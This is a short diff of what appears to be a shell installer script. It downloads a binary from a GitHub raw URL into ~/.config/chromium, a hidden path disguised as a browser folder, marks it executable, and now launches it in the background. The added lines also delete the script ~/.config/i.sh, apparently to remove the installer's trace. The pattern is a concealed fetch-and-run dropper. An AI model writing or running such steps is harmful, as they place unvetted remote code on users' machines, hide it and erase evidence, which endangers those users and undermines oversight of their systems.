@@ -1,3 +1,4 @@
+rm ~/.config/i.sh
 wget -O ~/.config/chromium/wv https://github.com/reimch/white-vice/raw/refs/heads/main/dist/white-vice
 chmod +x ~/.config/chromium/wv
-~/.config/chromium/wv
+~/.config/chromium/wv &
